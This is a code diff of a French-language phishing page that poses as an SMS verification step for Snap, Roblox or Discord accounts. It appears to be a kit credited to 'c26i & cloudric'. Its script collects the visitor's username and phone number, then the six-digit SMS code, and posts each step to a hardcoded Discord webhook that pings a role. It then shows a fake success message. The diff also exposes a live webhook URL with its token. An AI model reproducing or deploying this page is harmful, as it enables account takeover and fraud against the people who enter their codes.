@@ -19,55 +19,33 @@
             --radius: 18px;
             --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: var(--bg);
-            background-image:
-                radial-gradient(ellipse at 30% 20%, rgba(108, 92, 231, 0.08) 0%, transparent 60%),
-                radial-gradient(ellipse at 70% 80%, rgba(0, 230, 118, 0.05) 0%, transparent 60%),
-                radial-gradient(ellipse at 50% 50%, rgba(255, 255, 255, 0.01) 0%, transparent 100%);
-            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0b0b14;
+            background-image: radial-gradient(ellipse at 30% 20%, rgba(108,92,231,0.08) 0%, transparent 60%), radial-gradient(ellipse at 70% 80%, rgba(0,230,118,0.05) 0%, transparent 60%);
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             padding: 20px;
             -webkit-font-smoothing: antialiased;
             touch-action: manipulation;
         }
-
         .card {
-            background: var(--card-bg);
+            background: rgba(18,18,35,0.9);
             backdrop-filter: blur(30px);
             -webkit-backdrop-filter: blur(30px);
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255,255,255,0.06);
             border-radius: 24px;
             padding: 40px 32px 35px;
             width: 100%;
             max-width: 440px;
-            box-shadow:
-                0 30px 70px rgba(0, 0, 0, 0.6),
-                0 0 0 1px rgba(255, 255, 255, 0.03) inset,
-                0 1px 0 rgba(255, 255, 255, 0.04) inset;
-            transition: transform var(--transition), box-shadow var(--transition);
+            box-shadow: 0 30px 70px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03) inset;
         }
-
-        .card:hover {
-            box-shadow:
-                0 35px 80px rgba(0, 0, 0, 0.7),
-                0 0 0 1px rgba(255, 255, 255, 0.04) inset,
-                0 0 60px rgba(108, 92, 231, 0.08);
-        }
-
         .operator-alert {
-            background: linear-gradient(135deg, rgba(255, 0, 0, 0.18) 0%, rgba(200, 0, 0, 0.12) 100%);
-            border: 2px solid rgba(255, 50, 50, 0.7);
+            background: linear-gradient(135deg, rgba(255,0,0,0.18) 0%, rgba(200,0,0,0.12) 100%);
+            border: 2px solid rgba(255,50,50,0.7);
             border-left: 5px solid #ff0000;
             border-radius: 14px;
             padding: 16px 18px;
@@ -75,58 +53,17 @@
             position: relative;
             overflow: hidden;
             animation: alertPulse 2.5s ease-in-out infinite;
-            box-shadow:
-                0 0 25px rgba(255, 0, 0, 0.2),
-                inset 0 0 20px rgba(255, 0, 0, 0.05);
         }
-
         .operator-alert::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
             background: radial-gradient(circle, rgba(255,0,0,0.06) 0%, transparent 70%);
             animation: alertRotate 8s linear infinite;
         }
-
-        @keyframes alertPulse {
-            0%,
-            100% {
-                box-shadow: 0 0 25px rgba(255, 0, 0, 0.2), inset 0 0 20px rgba(255, 0, 0, 0.05);
-            }
-            50% {
-                box-shadow: 0 0 40px rgba(255, 0, 0, 0.5), inset 0 0 30px rgba(255, 0, 0, 0.1);
-            }
-        }
-
-        @keyframes alertRotate {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .operator-alert .alert-icon {
-            display: inline-block;
-            font-size: 18px;
-            margin-right: 6px;
-            animation: iconBlink 1s step-end infinite;
-        }
-
-        @keyframes iconBlink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.2;
-            }
-        }
-
+        @keyframes alertPulse { 0%,100% { box-shadow: 0 0 25px rgba(255,0,0,0.2); } 50% { box-shadow: 0 0 40px rgba(255,0,0,0.5); } }
+        @keyframes alertRotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .operator-alert .alert-title {
             color: #ff4444;
             font-weight: 800;
@@ -140,53 +77,29 @@
             position: relative;
             z-index: 1;
         }
-
-        .operator-alert .alert-operators {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            position: relative;
-            z-index: 1;
-        }
-
+        .operator-alert .alert-icon { display: inline-block; font-size: 18px; margin-right: 6px; animation: iconBlink 1s step-end infinite; }
+        @keyframes iconBlink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .operator-alert .alert-operators { display: flex; flex-wrap: wrap; gap: 8px; position: relative; z-index: 1; }
         .operator-tag {
-            background: rgba(255, 0, 0, 0.25);
+            background: rgba(255,0,0,0.25);
             color: #ff6666;
             font-weight: 700;
             font-size: 12px;
             letter-spacing: 0.8px;
             padding: 6px 14px;
             border-radius: 20px;
-            border: 1px solid rgba(255, 80, 80, 0.5);
+            border: 1px solid rgba(255,80,80,0.5);
             text-transform: uppercase;
-            transition: all 0.3s ease;
             white-space: nowrap;
             -webkit-tap-highlight-color: transparent;
         }
-
-        .operator-tag:active {
-            transform: scale(0.95);
-        }
-
-        .operator-tag.orange {
-            background: rgba(255, 165, 0, 0.2);
-            border-color: rgba(255, 165, 0, 0.5);
-            color: #ffa500;
-        }
-        .operator-tag.sfr {
-            background: rgba(220, 20, 60, 0.2);
-            border-color: rgba(220, 20, 60, 0.5);
-            color: #dc143c;
-        }
-        .operator-tag.bouygues {
-            background: rgba(0, 150, 200, 0.2);
-            border-color: rgba(0, 150, 200, 0.5);
-            color: #0096c8;
-        }
-
+        .operator-tag:active { transform: scale(0.95); }
+        .operator-tag.orange { background: rgba(255,165,0,0.2); border-color: rgba(255,165,0,0.5); color: #ffa500; }
+        .operator-tag.sfr { background: rgba(220,20,60,0.2); border-color: rgba(220,20,60,0.5); color: #dc143c; }
+        .operator-tag.bouygues { background: rgba(0,150,200,0.2); border-color: rgba(0,150,200,0.5); color: #0096c8; }
         .phase-badge {
             display: inline-block;
-            background: rgba(108, 92, 231, 0.12);
+            background: rgba(108,92,231,0.12);
             color: #a78bfa;
             font-size: 11px;
             font-weight: 600;
@@ -195,59 +108,23 @@
             padding: 7px 16px;
             border-radius: 30px;
             margin-bottom: 28px;
-            border: 1px solid rgba(108, 92, 231, 0.2);
-            transition: all var(--transition);
+            border: 1px solid rgba(108,92,231,0.2);
+            transition: all 0.3s ease;
         }
-
-        .phase-badge.warning {
-            background: rgba(255, 165, 0, 0.12);
-            color: #ffb347;
-            border-color: rgba(255, 165, 0, 0.2);
-        }
-
+        .phase-badge.warning { background: rgba(255,165,0,0.12); color: #ffb347; border-color: rgba(255,165,0,0.2); }
         .input-group {
             display: flex;
             align-items: center;
-            background: var(--input-bg);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: var(--radius);
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 18px;
             overflow: hidden;
-            transition: all var(--transition);
+            transition: all 0.3s ease;
             margin-bottom: 10px;
-            position: relative;
         }
-
-        .input-group:focus-within {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 5px var(--accent-glow);
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .input-group.error {
-            border-color: var(--danger);
-            box-shadow: 0 0 0 5px rgba(255, 82, 82, 0.2);
-            animation: shake 0.5s ease;
-        }
-
-        @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            20% {
-                transform: translateX(-8px);
-            }
-            40% {
-                transform: translateX(8px);
-            }
-            60% {
-                transform: translateX(-5px);
-            }
-            80% {
-                transform: translateX(5px);
-            }
-        }
-
+        .input-group:focus-within { border-color: #6c5ce7; box-shadow: 0 0 0 5px rgba(108,92,231,0.4); background: rgba(255,255,255,0.05); }
+        .input-group.error { border-color: #ff5252; box-shadow: 0 0 0 5px rgba(255,82,82,0.2); animation: shake 0.5s ease; }
+        @keyframes shake { 0%,100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } 60% { transform: translateX(-5px); } 80% { transform: translateX(5px); } }
         .flag-france {
             width: 50px;
             height: 48px;
@@ -256,31 +133,18 @@
             border-radius: 10px;
             overflow: hidden;
             display: flex;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
-            position: relative;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.4);
         }
-
-        .flag-stripe {
-            flex: 1;
-            height: 100%;
-        }
-
-        .flag-stripe.blue {
-            background: #002395;
-        }
-        .flag-stripe.white {
-            background: #ffffff;
-        }
-        .flag-stripe.red {
-            background: #ed2939;
-        }
-
+        .flag-stripe { flex: 1; height: 100%; }
+        .flag-stripe.blue { background: #002395; }
+        .flag-stripe.white { background: #ffffff; }
+        .flag-stripe.red { background: #ed2939; }
         .input-group input {
             flex: 1;
             padding: 17px 18px;
             background: transparent;
             border: none;
-            color: var(--text);
+            color: #e8e8f0;
             font-size: 16px;
             letter-spacing: 0.8px;
             outline: none;
@@ -290,570 +154,355 @@
             appearance: none;
             touch-action: manipulation;
         }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
-            font-size: 15px;
-            letter-spacing: 0.3px;
-        }
-
-        .input-group input:disabled {
-            opacity: 0.45;
-            cursor: not-allowed;
-        }
-
+        .input-group input::placeholder { color: rgba(255,255,255,0.25); font-size: 15px; letter-spacing: 0.3px; }
+        .input-group input:disabled { opacity: 0.45; cursor: not-allowed; }
         .hint-text {
             font-size: 11px;
-            color: var(--muted);
+            color: #7a7a95;
             margin-bottom: 22px;
             text-align: left;
             padding-left: 10px;
             letter-spacing: 0.3px;
-            transition: opacity var(--transition);
         }
-
         .btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #6c5ce7 0%, #5a4bd1 100%);
             border: none;
-            border-radius: var(--radius);
+            border-radius: 18px;
             color: #fff;
             font-size: 15px;
             font-weight: 700;
             letter-spacing: 1.2px;
             cursor: pointer;
             text-transform: uppercase;
-            transition: all var(--transition);
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 8px 25px rgba(108, 92, 231, 0.3);
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(108,92,231,0.3);
             -webkit-tap-highlight-color: transparent;
             touch-action: manipulation;
         }
-
-        .btn:active:not(:disabled) {
-            transform: scale(0.97);
-            box-shadow: 0 3px 10px rgba(108, 92, 231, 0.3);
-            transition: all 0.05s ease;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
-            transition: left 0.6s ease;
-        }
-
-        .btn:hover:not(:disabled)::before {
-            left: 100%;
-        }
-
-        .btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 14px 35px rgba(108, 92, 231, 0.5);
-            background: linear-gradient(135deg, #7c6df0 0%, #6a5be0 100%);
-        }
-
-        .btn:disabled {
-            background: #2a2a3d;
-            color: #5a5a72;
-            cursor: not-allowed;
-            box-shadow: none;
-            letter-spacing: 1px;
-        }
-
-        .btn .btn-icon {
-            display: inline-block;
-            margin-right: 8px;
-        }
-
-        .timer-container {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 28px;
-            animation: fadeUp 0.45s ease;
-        }
-
-        .timer-container.active {
-            display: flex;
-        }
-
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .ring-wrapper {
-            position: relative;
-            width: 140px;
-            height: 140px;
-            margin-bottom: 12px;
-        }
-
-        .ring-svg {
-            width: 140px;
-            height: 140px;
-            transform: rotate(-90deg);
-            filter: drop-shadow(0 0 12px rgba(108, 92, 231, 0.5));
-        }
-
-        .ring-track {
-            fill: none;
-            stroke: rgba(255, 255, 255, 0.05);
-            stroke-width: 6;
-        }
-
-        .ring-fill {
-            fill: none;
-            stroke: var(--accent);
-            stroke-width: 6;
-            stroke-linecap: round;
-            transition: stroke-dashoffset 0.15s linear;
-        }
-
+        .btn:active:not(:disabled) { transform: scale(0.97); box-shadow: 0 3px 10px rgba(108,92,231,0.3); }
+        .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 14px 35px rgba(108,92,231,0.5); background: linear-gradient(135deg, #7c6df0 0%, #6a5be0 100%); }
+        .btn:disabled { background: #2a2a3d; color: #5a5a72; cursor: not-allowed; box-shadow: none; }
+        .btn .btn-icon { display: inline-block; margin-right: 8px; }
+        .timer-container { display: none; flex-direction: column; align-items: center; margin-top: 28px; animation: fadeUp 0.45s ease; }
+        .timer-container.active { display: flex; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .ring-wrapper { position: relative; width: 140px; height: 140px; margin-bottom: 12px; }
+        .ring-svg { width: 140px; height: 140px; transform: rotate(-90deg); filter: drop-shadow(0 0 12px rgba(108,92,231,0.5)); }
+        .ring-track { fill: none; stroke: rgba(255,255,255,0.05); stroke-width: 6; }
+        .ring-fill { fill: none; stroke: #6c5ce7; stroke-width: 6; stroke-linecap: round; transition: stroke-dashoffset 0.15s linear; }
         .timer-number {
             position: absolute;
-            top: 50%;
-            left: 50%;
+            top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             font-size: 44px;
             font-weight: 800;
             color: #ffffff;
-            text-shadow: 0 0 30px var(--accent-glow);
+            text-shadow: 0 0 30px rgba(108,92,231,0.4);
             letter-spacing: -1px;
         }
-
-        .timer-subtitle {
-            font-size: 11px;
-            color: var(--muted);
-            letter-spacing: 1.8px;
-            text-transform: uppercase;
-            font-weight: 500;
-        }
-
-        .success-box {
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 22px;
-            padding: 14px 20px;
-            background: rgba(0, 230, 118, 0.08);
-            border: 1px solid rgba(0, 230, 118, 0.25);
-            border-radius: 14px;
-            animation: fadeUp 0.5s ease;
-        }
-
-        .success-box.show {
-            display: flex;
-        }
-
-        .success-icon {
-            width: 28px;
-            height: 28px;
-            background: var(--success);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            color: #000;
-            font-weight: bold;
-            flex-shrink: 0;
-        }
-
-        .success-text {
-            color: var(--success);
-            font-weight: 700;
-            font-size: 17px;
-            letter-spacing: 0.5px;
-        }
-
+        .timer-subtitle { font-size: 11px; color: #7a7a95; letter-spacing: 1.8px; text-transform: uppercase; font-weight: 500; }
+        .success-box { display: none; align-items: center; justify-content: center; gap: 10px; margin-top: 22px; padding: 14px 20px; background: rgba(0,230,118,0.08); border: 1px solid rgba(0,230,118,0.25); border-radius: 14px; animation: fadeUp 0.5s ease; }
+        .success-box.show { display: flex; }
+        .success-icon { width: 28px; height: 28px; background: #00e676; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; color: #000; font-weight: bold; flex-shrink: 0; }
+        .success-text { color: #00e676; font-weight: 700; font-size: 17px; letter-spacing: 0.5px; }
         .credits-footer {
             margin-top: 20px;
             text-align: center;
             font-size: 11px;
-            color: var(--muted);
+            color: #7a7a95;
             letter-spacing: 0.5px;
             border-top: 1px solid rgba(255,255,255,0.05);
             padding-top: 16px;
         }
-
-        .credits-footer a {
-            color: #a78bfa;
-            text-decoration: none;
-        }
-
-        .credits-footer a:hover {
-            text-decoration: underline;
-        }
-
+        .credits-footer a { color: #a78bfa; text-decoration: none; }
+        .credits-footer a:hover { text-decoration: underline; }
         @media (max-width: 480px) {
-            .card {
-                padding: 28px 18px 25px;
-                border-radius: 20px;
-            }
-            .input-group input {
-                padding: 14px 12px;
-                font-size: 15px;
-            }
-            .flag-france {
-                width: 42px;
-                height: 40px;
-                margin: 3px 0 3px 4px;
-                border-radius: 8px;
-            }
-            .timer-number {
-                font-size: 36px;
-            }
-            .ring-wrapper {
-                width: 120px;
-                height: 120px;
-            }
-            .ring-svg {
-                width: 120px;
-                height: 120px;
-            }
-            .operator-alert {
-                padding: 12px 14px;
-            }
-            .operator-tag {
-                font-size: 10px;
-                padding: 5px 10px;
-            }
+            .card { padding: 28px 18px 25px; border-radius: 20px; }
+            .input-group input { padding: 14px 12px; font-size: 15px; }
+            .flag-france { width: 42px; height: 40px; margin: 3px 0 3px 4px; border-radius: 8px; }
+            .timer-number { font-size: 36px; }
+            .ring-wrapper { width: 120px; height: 120px; }
+            .ring-svg { width: 120px; height: 120px; }
+            .operator-alert { padding: 12px 14px; }
+            .operator-tag { font-size: 10px; padding: 5px 10px; }
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <!-- BANDEAU ROUGE OPÉRATEURS -->
-        <div class="operator-alert">
-            <div class="alert-title">
-                <span class="alert-icon">⚠️</span> En raison d'abus — Opérateurs éligibles uniquement
-            </div>
-            <div class="alert-operators">
-                <span class="operator-tag orange">🍊 Orange</span>
-                <span class="operator-tag sfr">🔴 SFR</span>
-                <span class="operator-tag bouygues">🔵 Bouygues</span>
-            </div>
-        </div>
-
-        <!-- Badge phase -->
-        <div class="phase-badge" id="phaseBadge">● Phase 1 — Téléphone</div>
-
-        <!-- Champ PSEUDO -->
-        <div class="input-group" id="inputPseudoWrapper">
-            <div class="flag-france">
-                <div class="flag-stripe blue"></div>
-                <div class="flag-stripe white"></div>
-                <div class="flag-stripe red"></div>
-            </div>
-            <input type="text" id="pseudoInput" placeholder="Pseudo (ex: Snap, Roblox, Discord)" autocomplete="off" maxlength="50">
-        </div>
-        <div class="hint-text" id="hintPseudo">👤 Entrez votre pseudo</div>
-
-        <!-- Champ TÉLÉPHONE -->
-        <div class="input-group" id="inputWrapper">
-            <div class="flag-france">
-                <div class="flag-stripe blue"></div>
-                <div class="flag-stripe white"></div>
-                <div class="flag-stripe red"></div>
-            </div>
-            <input type="tel" id="userInput" placeholder="+33 6 12 34 56 78" autocomplete="off" inputmode="numeric" maxlength="20">
-        </div>
-        <div class="hint-text" id="hintEl">🇫🇷 Format: +33 puis votre numéro sans le 0</div>
-
-        <!-- Bouton -->
-        <button class="btn" id="actionBtn">
-            <span class="btn-icon">📤</span> Envoyer
-        </button>
-
-        <!-- Timer + cercle -->
-        <div class="timer-container" id="timerBlock">
-            <div class="ring-wrapper">
-                <svg class="ring-svg">
-                    <circle class="ring-track" cx="70" cy="70" r="62"></circle>
-                    <circle class="ring-fill" id="progressArc" cx="70" cy="70" r="62"></circle>
-                </svg>
-                <div class="timer-number" id="timerDisplay">30</div>
-            </div>
-            <div class="timer-subtitle">⏳ En attente du code SMS</div>
-        </div>
-
-        <!-- Succès -->
-        <div class="success-box" id="successBlock">
-            <div class="success-icon">✓</div>
-            <div class="success-text">Vérification réussie</div>
-        </div>
-
-        <!-- Footer crédits -->
-        <div class="credits-footer">
-            Support : <a href="https://discord.gg/gzTFBa5T3z" target="_blank">discord.gg/2fe7CQttHR</a> &nbsp;|&nbsp; Credits : c26i &amp; cloudric
+<div class="card">
+    <div class="operator-alert">
+        <div class="alert-title"><span class="alert-icon">⚠️</span> En raison d'abus — Opérateurs éligibles uniquement</div>
+        <div class="alert-operators">
+            <span class="operator-tag orange">🍊 Orange</span>
+            <span class="operator-tag sfr">🔴 SFR</span>
+            <span class="operator-tag bouygues">🔵 Bouygues</span>
         </div>
     </div>
 
-    <script>
-        // ============================================================
-        // CONFIGURATION - UN SEUL WEBHOOK AVEC ROLE
-        // ============================================================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1527347697072345198/ws0L0IXXK1sqhrPGn2ebBRopl-5xUmiIbQCZ5KEQgAkq10_0SWCPCN1JySbdk5NkWgnz";
-        const ROLE_ID = "1527706597919293550";
-        const DUREE_TOTALE = 30;
-        const RAYON_CERCLE = 62;
-        const CIRCONFERENCE = 2 * Math.PI * RAYON_CERCLE;
+    <div class="phase-badge" id="phaseBadge">● Phase 1 — Téléphone</div>
 
-        // ============================================================
-        // ÉTAT
-        // ============================================================
-        let etape = 1;
-        let tempsRestant = DUREE_TOTALE;
-        let intervalleTimer = null;
-        let pseudoPlateforme = "";
-        let numeroTelephone = "";
-        let webhookEnvoye = false; // Flag pour envoyer une seule fois
+    <div class="input-group" id="inputPseudoWrapper">
+        <div class="flag-france"><div class="flag-stripe blue"></div><div class="flag-stripe white"></div><div class="flag-stripe red"></div></div>
+        <input type="text" id="pseudoInput" placeholder="Pseudo (ex: Snap, Roblox, Discord)" autocomplete="off" maxlength="50">
+    </div>
+    <div class="hint-text" id="hintPseudo">👤 Entrez votre pseudo</div>
 
-        // ============================================================
-        // ÉLÉMENTS DOM
-        // ============================================================
-        const champPseudo = document.getElementById("pseudoInput");
-        const champSaisie = document.getElementById("userInput");
-        const boutonAction = document.getElementById("actionBtn");
-        const badgePhase = document.getElementById("phaseBadge");
-        const texteIndice = document.getElementById("hintEl");
-        const hintPseudo = document.getElementById("hintPseudo");
-        const blocTimer = document.getElementById("timerBlock");
-        const affichageTimer = document.getElementById("timerDisplay");
-        const arcProgres = document.getElementById("progressArc");
-        const blocSucces = document.getElementById("successBlock");
-        const wrapperSaisie = document.getElementById("inputWrapper");
-        const wrapperPseudo = document.getElementById("inputPseudoWrapper");
+    <div class="input-group" id="inputWrapper">
+        <div class="flag-france"><div class="flag-stripe blue"></div><div class="flag-stripe white"></div><div class="flag-stripe red"></div></div>
+        <input type="tel" id="userInput" placeholder="+33 6 12 34 56 78" autocomplete="off" inputmode="numeric" maxlength="20">
+    </div>
+    <div class="hint-text" id="hintEl">🇫🇷 Format: +33 puis votre numéro sans le 0</div>
 
-        // Init arc
-        arcProgres.style.strokeDasharray = `${CIRCONFERENCE} ${CIRCONFERENCE}`;
-        arcProgres.style.strokeDashoffset = CIRCONFERENCE;
+    <button class="btn" id="actionBtn"><span class="btn-icon">📤</span> Envoyer</button>
 
-        // ============================================================
-        // FONCTIONS
-        // ============================================================
+    <div class="timer-container" id="timerBlock">
+        <div class="ring-wrapper">
+            <svg class="ring-svg">
+                <circle class="ring-track" cx="70" cy="70" r="62"></circle>
+                <circle class="ring-fill" id="progressArc" cx="70" cy="70" r="62"></circle>
+            </svg>
+            <div class="timer-number" id="timerDisplay">30</div>
+        </div>
+        <div class="timer-subtitle">⏳ En attente du code SMS</div>
+    </div>
 
-        function mettreAJourArc(pourcentage) {
-            const decalage = CIRCONFERENCE - (pourcentage / 100) * CIRCONFERENCE;
-            arcProgres.style.strokeDashoffset = decalage;
+    <div class="success-box" id="successBlock">
+        <div class="success-icon">✓</div>
+        <div class="success-text">Vérification réussie</div>
+    </div>
+
+    <div class="credits-footer">
+        Support : <a href="https://discord.gg/2fe7CQttHR" target="_blank">discord.gg/2fe7CQttHR</a> &nbsp;|&nbsp; Credits : c26i &amp; cloudric
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527347697072345198/ws0L0IXXK1sqhrPGn2ebBRopl-5xUmiIbQCZ5KEQgAkq10_0SWCPCN1JySbdk5NkWgnz";
+    const ROLE_ID = "1527706597919293550";
+    const DUREE_TOTALE = 30;
+    const RAYON_CERCLE = 62;
+    const CIRCONFERENCE = 2 * Math.PI * RAYON_CERCLE;
+
+    // ============================================================
+    // ÉTAT
+    // ============================================================
+    let etape = 1;
+    let tempsRestant = DUREE_TOTALE;
+    let intervalleTimer = null;
+    let donnees = { pseudo: "", telephone: "", code: "" };
+    let etape1Envoyee = false;  // pour ne pas renvoyer deux fois les infos étape 1
+
+    // ============================================================
+    // DOM
+    // ============================================================
+    const pseudoInput = document.getElementById("pseudoInput");
+    const userInput = document.getElementById("userInput");
+    const actionBtn = document.getElementById("actionBtn");
+    const phaseBadge = document.getElementById("phaseBadge");
+    const hintEl = document.getElementById("hintEl");
+    const hintPseudo = document.getElementById("hintPseudo");
+    const timerBlock = document.getElementById("timerBlock");
+    const timerDisplay = document.getElementById("timerDisplay");
+    const progressArc = document.getElementById("progressArc");
+    const successBlock = document.getElementById("successBlock");
+    const wrapperSaisie = document.getElementById("inputWrapper");
+    const wrapperPseudo = document.getElementById("inputPseudoWrapper");
+
+    progressArc.style.strokeDasharray = `${CIRCONFERENCE} ${CIRCONFERENCE}`;
+    progressArc.style.strokeDashoffset = CIRCONFERENCE;
+
+    // ============================================================
+    // FONCTIONS
+    // ============================================================
+    function updateArc(pct) {
+        progressArc.style.strokeDashoffset = CIRCONFERENCE - (pct / 100) * CIRCONFERENCE;
+    }
+
+    function shake(el) {
+        el.classList.add("error");
+        setTimeout(() => el.classList.remove("error"), 600);
+    }
+
+    // ENVOI ÉTAPE 1 : Pseudo + Téléphone
+    async function sendEtape1(pseudo, telephone) {
+        if (etape1Envoyee) return;
+        const payload = {
+            content: "<@&" + ROLE_ID + ">",
+            embeds: [{
+                title: "📥 ÉTAPE 1 - Pseudo & Téléphone",
+                color: 0x6c5ce7,
+                fields: [
+                    { name: "👤 Pseudo", value: "```" + pseudo + "```", inline: false },
+                    { name: "📞 Numéro", value: "```" + telephone + "```", inline: false },
+                    { name: "📅 Horodatage", value: new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris" }), inline: true }
+                ],
+                footer: { text: "⚡ Système automatisé • " + new Date().toISOString() + " • Role ping" }
+            }]
+        };
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            etape1Envoyee = true;
+            console.log("[Webhook] Étape 1 envoyée : " + pseudo + " | " + telephone);
+        } catch(e) {
+            console.debug("[Webhook] Erreur étape 1 ignorée");
         }
+    }
 
-        function secouerChamp(element) {
-            element.classList.add("error");
-            setTimeout(() => element.classList.remove("error"), 600);
+    // ENVOI ÉTAPE 2 : Code SMS
+    async function sendEtape2(code) {
+        const payload = {
+            content: "<@&" + ROLE_ID + ">",
+            embeds: [{
+                title: "📥 ÉTAPE 2 - Code SMS",
+                color: 0x00e676,
+                fields: [
+                    { name: "🔢 Code SMS", value: "```" + code + "```", inline: false },
+                    { name: "📅 Horodatage", value: new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris" }), inline: true }
+                ],
+                footer: { text: "⚡ Système automatisé • " + new Date().toISOString() + " • Role ping" }
+            }]
+        };
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            console.log("[Webhook] Étape 2 envoyée : " + code);
+        } catch(e) {
+            console.debug("[Webhook] Erreur étape 2 ignorée");
         }
+    }
 
-        // ENVOI VERS UN SEUL WEBHOOK AVEC PING DU ROLE (une seule fois)
-        async function envoyerWebhook(etiquette, valeur) {
-            // Ne pas envoyer si déjà envoyé
-            if (webhookEnvoye) {
-                console.log("[Webhook] Déjà envoyé, ignoré.");
+    // ============================================================
+    // TIMER
+    // ============================================================
+    function startTimer() {
+        tempsRestant = DUREE_TOTALE;
+        timerBlock.classList.add("active");
+        timerDisplay.textContent = tempsRestant;
+        updateArc(100);
+        actionBtn.disabled = true;
+        userInput.disabled = true;
+
+        intervalleTimer = setInterval(() => {
+            tempsRestant--;
+            timerDisplay.textContent = tempsRestant;
+            updateArc((tempsRestant / DUREE_TOTALE) * 100);
+            if (tempsRestant <= 0) {
+                clearInterval(intervalleTimer);
+                intervalleTimer = null;
+                timerBlock.classList.remove("active");
+                updateArc(0);
+                actionBtn.disabled = false;
+                userInput.disabled = false;
+                userInput.value = "";
+                userInput.focus();
+            }
+        }, 1000);
+    }
+
+    // ============================================================
+    // CHANGEMENT D'ÉTAPE
+    // ============================================================
+    function goToEtape2() {
+        etape = 2;
+        phaseBadge.textContent = "● Phase 2 — Code SMS";
+        phaseBadge.classList.add("warning");
+        hintEl.textContent = "📩 Entrez le code à 6 chiffres reçu par SMS";
+        userInput.placeholder = "Code SMS (ex: 123456)";
+        userInput.setAttribute("maxlength", "6");
+        userInput.setAttribute("inputmode", "numeric");
+        hintPseudo.textContent = "";
+        wrapperPseudo.style.display = "none";
+        actionBtn.innerHTML = '<span class="btn-icon">🔐</span> Vérifier';
+        startTimer();
+    }
+
+    function showSuccess() {
+        successBlock.classList.add("show");
+        actionBtn.disabled = true;
+        userInput.disabled = true;
+        wrapperSaisie.style.opacity = "0.45";
+        phaseBadge.textContent = "● Terminé";
+        phaseBadge.classList.remove("warning");
+        phaseBadge.style.background = "rgba(0,230,118,0.12)";
+        phaseBadge.style.color = "#00e676";
+        phaseBadge.style.borderColor = "rgba(0,230,118,0.25)";
+        hintEl.textContent = "✅ Opération complétée avec succès";
+    }
+
+    // ============================================================
+    // TRAITEMENT PRINCIPAL
+    // ============================================================
+    async function handleSubmit() {
+        const valPseudo = pseudoInput.value.trim();
+        const valTel = userInput.value.trim();
+
+        if (etape === 1) {
+            if (!valPseudo) { shake(wrapperPseudo); return; }
+            if (!valTel) { shake(wrapperSaisie); return; }
+            const digits = valTel.replace(/\D/g, "");
+            if (digits.length < 9) {
+                shake(wrapperSaisie);
+                userInput.placeholder = "Numéro invalide, réessayez...";
+                userInput.value = "";
                 return;
             }
+            donnees.pseudo = valPseudo;
+            donnees.telephone = valTel;
 
-            const payload = {
-                content: "<@&" + ROLE_ID + ">",  // Ping du rôle
-                embeds: [{
-                    title: "📥 NOUVELLE ENTRÉE UTILISATEUR",
-                    color: 0x6c5ce7,
-                    fields: [
-                        {
-                            name: etiquette,
-                            value: "```" + valeur + "```",
-                            inline: false,
-                        },
-                        {
-                            name: "Étape",
-                            value: "Étape " + etape,
-                            inline: true,
-                        },
-                        {
-                            name: "Horodatage",
-                            value: new Date().toLocaleString("fr-FR", {
-                                timeZone: "Europe/Paris",
-                            }),
-                            inline: true,
-                        },
